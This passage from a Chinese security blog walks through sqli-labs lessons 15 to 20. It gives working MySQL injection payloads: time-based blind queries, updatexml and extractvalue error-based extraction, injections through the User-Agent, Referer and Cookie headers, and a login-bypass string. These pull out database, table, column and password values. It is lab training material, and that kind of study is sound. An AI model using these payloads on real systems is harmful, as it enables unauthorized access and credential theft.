+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;admin&#39; and if(length(database())&#x3D;8,sleep(5),1)--+&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</span><br><span class="line"></span><br><span class="line">uname&#x3D;admin&#39; and if(left(database(),1)&#x3D;&#39;s&#39;,sleep(5),1)--+&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</span><br><span class="line"></span><br><span class="line">uname&#x3D;admin&#39; and if( left((select table_name from information_schema.tables where table_schema&#x3D;database() limit 1,1),1)&#x3D;&#39;r&#39; ,sleep(5),1)--+&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</span><br><span class="line"> </span><br><span class="line">uname&#x3D;admin&#39; and if(left((select column_name from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 4,1),8)&#x3D;&#39;password&#39; ,sleep(5),1)--+&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</span><br><span class="line">uname&#x3D;admin&#39; and if(left((select password from users order by id limit 0,1),4)&#x3D;&#39;dumb&#39; ,sleep(5),1)--+&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</span><br><span class="line"> </span><br><span class="line">uname&#x3D;admin&#39; and if(left((select username from users order by id limit 0,1),4)&#x3D;&#39;dumb&#39; ,sleep(5),1)--+&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h3 id="Less-16-基于布尔型或时间延迟的双引号POST型盲注">Less-16 基于布尔型或时间延迟的双引号POST型盲注</h3>
+<p>把Less-15的单引号改成双引号即可。</p>
+<blockquote>
+<p>另外还可以使用 万能账号绕过密码验证<code>admin&quot;)# </code>验证。</p>
+</blockquote>
+<h3 id="Less-17-基于错误的更新查询POST注入">Less-17 基于错误的更新查询POST注入</h3>
+<p>无论怎么输入也没有错误回显，查阅<code>index.php</code>源码可以看到<code>check_input</code>函数对参数<code>uname</code>进行的处理，仔细一下这个函数的源码：</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191019162506.png" alt=""></p>
+<p>第一步，只截取前15个字符；</p>
+<p>第二步，首先介绍<code>get_magic_quotes_gpc()</code>函数的作用：</p>
+<ul>
+<li>
+<p>当magic_quotes_gpc=On的时候，函数get_magic_quotes_gpc()就会返回1</p>
+</li>
+<li>
+<p>当magic_quotes_gpc=Off的时候，函数get_magic_quotes_gpc()就会返回0</p>
+</li>
+</ul>
+<p><code>get_magic_quotes_gpc()</code>函数在php中的作用是判断解析用户提示的数据，如包括有：post、get、cookie过来的数据增加转义字符“\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染而出现致命的误。</p>
+<p>也就是说，在magic_quotes_gpc = On的情况下，如果输入的数据有单引号<code>'</code>、双引号<code>&quot;</code>、反斜线<code>\</code>与 <code>NULL</code>等字符都会被加上反斜线。</p>
+<p>第三步，<code>stripslashes()</code>函数删除反斜线；</p>
+<p>第四步，<code>ctype_digit()</code>函数 判断是否是数字，是数字就返回true，否则返回false；</p>
+<p>第五步，<code> intval()</code>整型转换。</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191019210958.png" alt=""></p>
+<p>对<code>username</code>搞了这么多花里胡哨的操作，但是<code>password</code>字段还是光秃秃的，使用<code>updatexml()</code>函数对<code>password</code>字段进行注入。</p>
+<h4 id="爆库payload-v5">爆库payload</h4>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;admin&amp;passwd&#x3D;admin&#39; and updatexml(1, concat(0x7e, database(), 0x7e),1)--+ &amp;submit&#x3D;Submit</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191020105155.png" alt=""></p>
+<h4 id="爆表名payload">爆表名payload</h4>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;admin&amp;passwd&#x3D;admin&#39; and updatexml(1, concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),0x7e),1) --+ &amp;submit&#x3D;Submit</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191020105523.png" alt=""></p>
+<h4 id="爆列名payload-v4">爆列名payload</h4>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;admin&amp;passwd&#x3D;admin&#39; and updatexml(1, concat(0x7e, (select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39;),0x7e),1) --+ &amp;submit&#x3D;Submit</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h4 id="爆值payload-v4">爆值payload</h4>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;admin&amp;passwd&#x3D;admin&#39; and updatexml(1,concat(0x7e,(select group_concat(password) from users),0x7e),1) --+ &amp;submit&#x3D;Submit</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>发现有报错：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">You can&#39;t specify target table &#39;tablename&#39; for update in FROM clause</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>这是因为在MySQL里，不能先<code>SELECT</code>一个表的记录，在按此条件进行更新和删除同一个表的记录。网上的解决办法是，将<code>SELECT</code>得到的结果，再通过中间表<code>SELECT</code>一遍，即：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;admin&amp;passwd&#x3D;admin&#39; and updatexml(1,concat(0x7e,(select password from (select group_concat(password) from users)),0x7e),1) --+ &amp;submit&#x3D;Submit</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>但是又出现了新的错误信息：</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191020110846.png" alt=""></p>
+<p>在做<strong>多表查询</strong>，或者查询的时候<strong>产生新的表</strong>的时候会出现这个错误：Every derived table must have its own alias（<strong>每一个派生出来的表都必须有一个自己的别名</strong>）。</p>
+<p>最终payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;admin&amp;passwd&#x3D;admin&#39; and updatexml(1,concat(0x7e,(select password from (select password from users limit 0,1) as test),0x7e),1) --+&amp;submit&#x3D;Submit</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191020111440.png" alt=""></p>
+<h3 id="Less-18-基于错误的Uagent头部字段POST注入">Less-18 基于错误的Uagent头部字段POST注入</h3>
+<p>如果登录正常的话，会显示UserAgent字段的信息：</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191020124947.png" alt=""></p>
+<p>抓包修改user-agent为一下payload就可以了：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#39;and extractvalue(1,concat(0x7e,(select database()),0x7e)) and &#39;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191020135010.png" alt=""></p>
+<p>其他的payload类似。</p>
+<h3 id="Less-19-基于错误的Reference头部字段POST注入">Less-19 基于错误的Reference头部字段POST注入</h3>
+<p>本题和上一题很像，回显是referer，查一下php文件可以发现，insert语句中向数据库插入了referer，所以注入点改为referer，paylaod和上一题完全一样，也可以参照less-12，将其双引号改为单引号作为本题payload，不再赘述。</p>
+<h3 id="Less-20-基于错误的Cookie头部字段POST注入">Less-20 基于错误的Cookie头部字段POST注入</h3>
+<p>登录成功后的页面：</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191020140033.png" alt=""></p>
+<p>再查看一下PHP文件：</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191020143926.png" alt=""></p>
+<p>用Burpsuite抓包改参数：</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191020144147.png" alt=""></p>
+<p>发现有数据库错误回显，构造payload：</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191020145928.png" alt=""></p>
+<p>另外还可以使用联合查询，首先判断列数：</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191020150201.png" alt=""></p>
+<p>再来构造一个样例payload：</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191020150343.png" alt=""></p>
+
+</div>
+
+
+  <div class="book-comments">
+    
+
+
+    <div id="disqus_thread"></div>
+    <script>
+    (function() { // DON'T EDIT BELOW THIS LINE
+    var d = document, s = d.createElement('script');
+    s.src = 'https://ca01h.disqus.com/embed.js';
+    s.setAttribute('data-timestamp', +new Date());
+    (d.head || d.body).appendChild(s);
+    })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+
+
+  </div>
+
+
+
+<script src="/js/book-post.js"></script>
+
+        </div>
+      </div>
+      <div class="column col-2 hide-lg">
+        <div class="book-post-info">
+  
+    <div class="book-post-meta">
+
+  <div class="author">
+
+    <!-- Author image 
+    <div class="author-img">
+      
+        <figure
+          class="avatar avatar-lg"
+          data-initial="c"
+          style="background-color: #3b4351;">
+        </figure>
+      
+    </div> -->
+
+    <!-- Author title
+    <div class="author-title">
+      <div>ca01h</div>
+      <div>2019-10-20</div>
+    </div> -->
+	
+	<script src="https://www.hackthebox.eu/badge/212159"></script>
+  </div> 
+
+  
+    <div class="divider"></div>
+
+    <div class="link">
+	  <i class="fas fa-folder-open"></i>&nbsp;
+      <a class="category-link" href="/categories/web%E5%AE%89%E5%85%A8/">web安全</a>-><a class="category-link" href="/categories/web%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/">基础学习</a>
+	  </br>
+	  <i class="fas fa-tags"></i>&nbsp;
+      <a class="tag-none-link" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag">#sql注入</a>
+    </div>
+    
+  
+
+  <div class="divider"></div>
+</div>
+  
+
+  <div class="book-tocbot">
+</div>
+<div class="book-tocbot-menu">
+  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
+  <a onclick="go_top()">Back to top</a>
+  <a onclick="go_bottom()">Go to bottom</a>
+</div>
+
+
+<script src="/js/book-toc.js"></script>
+
+</div>
+      </div>
+	  
+    </div>
+  </div>
+  
+  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
+</div>
+
+<div align="center">
+	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<span id="busuanzi_container_site_pv">Copyright © ca01h 2019-2020 | 本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+<!-- <span class="post-meta-divider">|</span> -->
+<!-- <span id="busuanzi_container_site_uv">本站访客数<span id="busuanzi_value_site_uv"></span>人</span> -->
+</div><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+
+</body>
+</html>
+
+
+
+<script src="/js/book.js"></script>
